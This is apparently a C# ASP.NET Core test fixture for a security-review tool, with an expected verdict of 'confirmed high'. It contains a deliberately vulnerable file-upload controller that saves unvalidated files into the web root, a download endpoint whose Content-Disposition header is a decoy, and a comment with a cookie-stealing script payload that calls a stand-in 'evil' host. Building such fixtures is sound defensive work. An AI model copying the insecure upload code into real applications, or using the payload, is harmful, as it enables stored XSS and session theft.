// Fixture: Upload stored inside the web root, "protected" by
// Content-Disposition on download (DECEPTIVE — looks protected, is NOT)
//
// This is a false-negative-avoidance fixture: the point is that a
// reviewer relying on "downloads force Content-Disposition: attachment"
// as the control for a browser-rendering risk must still flag this,
// because that header only affects a file fetched THROUGH this
// download endpoint — it does nothing for a request that hits the
// uploaded file directly via static-file serving, which never passes
// through this handler at all. See plays/file-security.md's "Uploads"
// section and plays/finding-validation.md's bias-toward-under-reporting
// note.
//
// Expected review outcome: CONFIRMED HIGH — unrestricted upload into a
// directory ASP.NET Core's StaticFiles middleware serves inline,
// resulting in stored XSS on the application's own origin (the
// uploaded file is attacker-controlled HTML/script, served with a
// browser-renderable content type), despite the presence of a
// Content-Disposition header on the (irrelevant, bypassable) download
// endpoint.
//
// Attack path (verified against ASP.NET Core's actual static-file
// behavior — an earlier version of this fixture claimed uploaded
// ".aspx" files would execute server-side; ASP.NET Core's StaticFiles
// middleware has no ".aspx" content-type mapping and does not execute
// anything, so that claim did not hold and has been corrected):
// uploaded files are saved under wwwroot/uploads/, which
// UseStaticFiles() serves directly and inline for any extension with a
// registered content type (.html included, by default, as
// text/html — see FileExtensionContentTypeProvider's default mapping).
// An attacker uploads "shell.html" containing
// <script>document.location='https://evil/?c='+document.cookie</script>
// and requests GET /uploads/shell.html directly — this never reaches
// DownloadController below, so its Content-Disposition header is never
// applied, and the browser renders the attacker's HTML/script on the
// application's own origin, able to read same-origin cookies (unless
// HttpOnly) and make same-origin requests.

using Microsoft.AspNetCore.Mvc;

namespace FixtureApp.Controllers;

[ApiController]
[Route("upload")]
public class UploadController : ControllerBase
{
    // wwwroot is the ASP.NET Core web root - StaticFiles serves
    // anything under it by default, inline, with the content type
    // inferred from the extension.
    private readonly string _uploadDir = "wwwroot/uploads";

    [HttpPost]
    public async Task<IActionResult> Upload(IFormFile file)
    {
        // VULNERABLE: no extension/content validation, original
        // filename used directly, saved inside the web root.
        var path = Path.Combine(_uploadDir, file.FileName);
        await using var stream = System.IO.File.Create(path);
        await file.CopyToAsync(stream);
        return Ok(new { path });
    }
}

[ApiController]
[Route("download")]
public class DownloadController : ControllerBase
{
    private readonly string _uploadDir = "wwwroot/uploads";

    [HttpGet("{fileName}")]
    public IActionResult Download(string fileName)
    {
        var path = Path.Combine(_uploadDir, fileName);
        var bytes = System.IO.File.ReadAllBytes(path);
        // This looks like a mitigation for "serving uploaded content
        // renders in the browser" - it does nothing to stop a direct
        // request to /uploads/shell.html, because that request never
        // reaches this action; StaticFiles serves it directly, inline,
        // with no Content-Disposition header at all.
        Response.Headers.Append("Content-Disposition", $"attachment; filename=\"{fileName}\"");
        return File(bytes, "application/octet-stream");
    }
}
